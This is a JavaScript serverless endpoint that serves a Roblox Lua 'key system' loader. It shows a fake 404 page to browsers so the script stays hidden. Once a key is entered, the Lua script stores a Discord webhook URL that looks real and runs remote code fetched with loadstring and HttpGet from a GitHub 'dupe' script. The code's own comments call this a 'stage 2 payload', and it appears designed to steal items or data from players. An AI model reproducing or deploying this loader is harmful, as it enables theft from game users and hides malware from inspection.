// api/load.js
export default async function handler(req, res) {
    // Check User-Agent
    const userAgent = req.headers['user-agent'] || '';

    // If browser, show 404
    if (userAgent.includes('Mozilla') && !userAgent.includes('Roblox')) {
        res.status(404).send(`<!DOCTYPE html>
<html>
<head>
<style>
body {background:#000;color:#666;text-align:center;padding:50px;}
</style>
</head>
<body>
<h1>404</h1>
<p>Page not found</p>
</body>
</html>`);
        return;
    }

    // --- PLACEHOLDER: REPLACE THIS WITH YOUR LUA SCRIPT ---
    const luaScript = `local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local DiscordButton = Instance.new("TextButton")
local KeyBox = Instance.new("TextBox")
local ValidateButton = Instance.new("TextButton")
local StatusLabel = Instance.new("TextLabel")

-- Configuration
local VALID_KEY = "X9n7g#2R$pT5!vBq8*W3zL@6yN1cK4mJ0dA^F%hS7uM5xG&bV8aZ9eQ2rP4wY6tU3iO1jH5sD8fC0"
local DISCORD_LINK = "https://discord.gg/pmeNrZHV"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1446225280955056158/ZHNN-ATzCOShcY1q98iVwEECz71D4YH-E3GwEtiwLRto9oYOKla4jo9F2e-jEc8VZ-Tr"

-- GUI Setup
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 2
MainFrame.BorderColor3 = Color3.fromRGB(0, 120, 215)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
MainFrame.Size = UDim2.new(0, 300, 0, 200)
MainFrame.Active = true
MainFrame.Draggable = true

TitleLabel.Name = "TitleLabel"
TitleLabel.Parent = MainFrame
TitleLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TitleLabel.Size = UDim2.new(1, 0, 0, 40)
TitleLabel.Font = Enum.Font.Code
TitleLabel.Text = "Key System"
TitleLabel.TextColor3 = Color3.fromRGB(0, 220, 150)
TitleLabel.TextSize = 18

DiscordButton.Name = "DiscordButton"
DiscordButton.Parent = MainFrame
DiscordButton.Position = UDim2.new(0.1, 0, 0.25, 0)
DiscordButton.Size = UDim2.new(0.8, 0, 0, 35)
DiscordButton.Font = Enum.Font.Code
DiscordButton.Text = "COPY DISCORD INVITE"
DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)

KeyBox.Name = "KeyBox"
KeyBox.Parent = MainFrame
KeyBox.Position = UDim2.new(0.1, 0, 0.55, 0)
KeyBox.Size = UDim2.new(0.8, 0, 0, 25)
KeyBox.Font = Enum.Font.Code
KeyBox.PlaceholderText = "Enter access key..."
KeyBox.Text = ""
KeyBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
KeyBox.TextColor3 = Color3.fromRGB(220, 220, 220)

ValidateButton.Name = "ValidateButton"
ValidateButton.Parent = MainFrame
ValidateButton.Position = UDim2.new(0.1, 0, 0.75, 0)
ValidateButton.Size = UDim2.new(0.8, 0, 0, 35)
ValidateButton.Font = Enum.Font.Code
ValidateButton.Text = "VALIDATE & EXECUTE"
ValidateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ValidateButton.BackgroundColor3 = Color3.fromRGB(215, 0, 0)

StatusLabel.Name = "StatusLabel"
StatusLabel.Parent = MainFrame
StatusLabel.Position = UDim2.new(0.1, 0, 0.9, 0)
StatusLabel.Size = UDim2.new(0.8, 0, 0, 20)
StatusLabel.Font = Enum.Font.Code
StatusLabel.Text = "Status: Awaiting input..."
StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
StatusLabel.BackgroundTransparency = 1

-- Discord button functionality
DiscordButton.MouseButton1Click:Connect(function()
    setclipboard(DISCORD_LINK)
    StatusLabel.Text = "Status: Discord link copied!"
    StatusLabel.TextColor3 = Color3.fromRGB(0, 220, 150)
    
    -- Optional: Open Discord automatically
    local HttpService = game:GetService("HttpService")
    pcall(function()
        HttpService:RequestAsync({
            Url = DISCORD_LINK,
            Method = "HEAD"
        })
    end)
end)

-- Validation and payload execution
ValidateButton.MouseButton1Click:Connect(function()
    local inputKey = KeyBox.Text
    
    if inputKey == VALID_KEY then
        StatusLabel.Text = "Status: Key validated! Loading..."
        StatusLabel.TextColor3 = Color3.fromRGB(0, 220, 150)
        
        -- Destroy GUI
        task.wait(1)
        ScreenGui:Destroy()
        
        -- Execute stage 2 payload
        task.spawn(function()
            -- Webhook configuration
            getgenv().UserWebhookURL = WEBHOOK_URL
            getgenv().UserPingThreshold = 50000000
            
            -- Load remote script
            local success, err = pcall(function()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
            end)
            
            if not success then
                warn("Payload execution failed: " .. tostring(err))
            end
        end)
    else
        StatusLabel.Text = "Status: Invalid key!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        
        -- Anti-tampering response
        KeyBox.Text = ""
        KeyBox.PlaceholderText = "Access denied..."
        ValidateButton.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
        
        -- Lockout after 3 failed attempts
        local attempts = (ValidateButton:GetAttribute("FailedAttempts") or 0) + 1
        ValidateButton:SetAttribute("FailedAttempts", attempts)
        
        if attempts >= 3 then
            ValidateButton.Text = "LOCKED"
            ValidateButton.Active = false
            StatusLabel.Text = "Status: System locked - contact admin"
        end
    end
end)

-- Optional: Auto-paste from clipboard
KeyBox.Focused:Connect(function()
    local clipboard = pcall(function()
        return game:GetService("UserInputService"):GetClipboard()
    end)
    if clipboard and type(clipboard) == "string" and clipboard:len() > 10 then
        KeyBox.Text = clipboard
    end
end)

-- Security: Self-destruct if injected incorrectly
if not game:IsLoaded() then
    ScreenGui:Destroy()
    return
end`;

    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(luaScript);
}
